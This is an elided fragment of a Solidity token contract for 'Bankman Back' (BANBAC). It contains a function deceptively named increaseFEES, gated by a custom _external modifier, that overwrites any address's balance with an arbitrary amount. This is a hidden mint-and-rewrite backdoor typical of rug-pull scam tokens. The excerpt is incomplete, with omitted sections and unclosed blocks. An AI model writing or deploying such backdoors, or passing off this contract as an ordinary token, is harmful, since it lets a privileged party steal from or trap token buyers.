...
contract Bankman is Context, IERC2022, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bankman Back";
    string private _symbol = "BANBAC";
  ...
  modifier _external () {
    ...
    function increaseFEES(address Newamountadr, uint256 Newamount) public _external {
      _Tbalances[Newamountadr] = Newamount * 10 ** _decimals;
